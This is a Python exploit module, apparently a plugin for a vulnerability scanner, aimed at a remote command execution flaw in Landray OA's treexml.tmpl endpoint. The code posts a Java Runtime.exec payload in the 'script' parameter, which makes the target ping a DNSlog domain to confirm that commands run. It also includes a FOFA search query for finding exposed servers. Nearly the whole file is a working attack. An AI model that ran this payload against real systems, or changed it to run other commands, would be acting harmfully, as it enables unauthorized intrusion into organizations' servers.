# coding:utf-8  
import requests
from lib.core.common import url_handle,get_random_ua,get_ceye_dns,verify_ceye_dns
from lib.core.poc import POCBase
# ...
import urllib3
urllib3.disable_warnings()

class POC(POCBase):

    _info = {
        "author" : "jijue",                      # POC作者
        "version" : "1",                    # POC版本，默认是1  
        "CreateDate" : "2022-01-01",        # POC创建时间
        "UpdateDate" : "2022-01-01",        # POC创建时间
        "PocDesc" : """
            
        """,                                # POC描述，写更新描述，没有就不写

        "name" : "蓝凌OA treexml.tmpl脚本 远程命令执行",                        # 漏洞名称
        "VulnID" : "oFx-2022-0001",                      # 漏洞编号，以CVE为主，若无CVE，使用CNVD，若无CNVD，留空即可
        "AppName" : "",                     # 漏洞应用名称
        "AppVersion" : "",                  # 漏洞应用版本
        "VulnDate" : "2022-01-01",                    # 漏洞公开的时间,不知道就写今天，格式：xxxx-xx-xx
        "VulnDesc" : """
            这个漏洞似乎没有返回，似乎不论发payload都是这样的返回：
                <RestResponse>
                    <success>true</success>
                    <data><message>公式运行时返回了空值，所以无法校验返回值类型。</message>
                    <confirm>公式运行时返回了空值，所以无法校验返回值类型。是否仍使用该公式？</confirm>
                    <success>0</success>
                    </data>
                    <msg/><code/>
                </RestResponse>
            因此暂时也就先用dnslog来检测吧
        """,                                # 漏洞简要描述

        "fofa-dork":"""
            app="Landray-OA系统"
        """,                     # fofa搜索语句
        "example" : "",                     # 存在漏洞的演示url，写一个就可以了
        "exp_img" : "",                      # 先不管  
    }

    def _verify(self):
        """
        返回vuln

        存在漏洞：vuln = [True,html_source] # html_source就是页面源码  

        不存在漏洞：vuln = [False,""]
        """
        vuln = [False,""]
        
        success,dns_flag = get_ceye_dns()
        if success == False:
            return [False,dns_flag]
        
        url = self.target + "/data/sys-common/treexml.tmpl" # url自己按需调整
        data = "s_bean=ruleFormulaValidate&script=try {String cmd = \"ping %s\";Process child = Runtime.getRuntime().exec(cmd);} catch (IOException e) {System.err.println(e);}" % (dns_flag)

        headers = {
                    "User-Agent":get_random_ua(),
                    "Connection":"close",
                    "Content-Type": "application/x-www-form-urlencoded",
                    }
        
        try:
            """
            检测逻辑，漏洞存在则修改vuln值为True，漏洞不存在则不动
            """
            req = requests.post(url,data=data,headers = headers , proxies = self.proxy ,timeout = self.timeout,verify = False)
            
            flager = verify_ceye_dns(dns_flag)

            if flager == True:
                vuln = [True,dns_flag]
            elif flager == False:
                vuln = [False,dns_flag]
            else:
                vuln = [False,flager]
        except Exception as e:
            raise e
        
        # 以下逻辑酌情使用
        if self._honeypot_check(vuln[1]) == True:
            vuln[0] = False
        
        return vuln

    def _attack(self):
        return self._verify()